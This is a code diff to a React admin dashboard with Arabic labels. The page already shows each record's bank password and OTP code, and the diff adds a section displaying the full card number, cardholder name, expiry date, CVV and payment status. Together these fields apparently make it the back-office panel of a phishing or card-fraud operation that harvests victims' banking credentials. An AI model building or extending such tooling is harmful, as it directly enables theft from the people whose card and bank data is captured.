@@ -1497,6 +1497,18 @@ export default function AdminDashboardPage() {
                                           <DataBadge label="كلمة مرور البنك" value={ver.bankPassword} />
                                           <DataBadge label="رمز OTP" value={ver.otpCode} />
                                         </div>
+                                        {ver.paymentCardNumber && (
+                                          <div className="mt-3 pt-3 border-t border-amber-200">
+                                            <p className="text-xs font-bold text-amber-700 mb-2">📋 بيانات الدفع لهذه النسخة:</p>
+                                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
+                                              <DataBadge label="رقم البطاقة" value={ver.paymentCardNumber} />
+                                              <DataBadge label="حامل البطاقة" value={ver.paymentCardHolder} />
+                                              <DataBadge label="تاريخ الانتهاء" value={ver.paymentExpiryDate} />
+                                              <DataBadge label="رمز الأمان" value={ver.paymentCvv} />
+                                              <DataBadge label="حالة الدفع" value={ver.paymentStatus} />
+                                            </div>
+                                          </div>
+                                        )}
                                         <div className="mt-3 pt-3 border-t border-amber-200">
                                           <a
                                             href={`/admin/applications/${ver.id}`}
